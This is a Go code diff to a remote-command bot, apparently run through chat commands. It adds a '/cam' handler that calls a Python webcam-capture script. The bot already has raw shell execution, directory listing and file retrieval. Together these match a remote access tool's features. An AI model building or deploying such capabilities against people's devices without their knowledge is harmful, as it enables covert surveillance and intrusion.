@@ -25,6 +25,7 @@ var registry = map[string]CommandFunc{
 	"/cmd":    handleRawCommand, // e.g., "/cmd dir"
 	"/ls":     handleListDir,
 	"/get":    handleGetFile,
+	"/cam":    handleWebcam,
 }
 
 func main() {
@@ -63,6 +64,23 @@ func handleGetFile(args string) {
 
 	fmt.Printf("🔍 Searching for '%s'...\n", args)
 	runProcess(VENV_PYTHON, "./scripts/get_file.py", args)
+}
+
+func handleWebcam(args string) {	
+	pollAmount := 1
+	pollDelay := 0
+
+	// Parse the arguments if the user provided them
+	if args != "" {
+		fmt.Sscanf(args, "%d %d", &pollAmount, &pollDelay)
+	}
+
+	// Convert ints to strings to pass to the Python script
+	amountStr := strconv.Itoa(pollAmount)
+	delayStr := strconv.Itoa(pollDelay)
+
+	// Trigger the script with the arguments
+	runProcess(VENV_PYTHON, "./scripts/webcam.py", amountStr, delayStr)
 }
 
 func handlePing(args string) { //a simple heartbeat to check if the bot is running
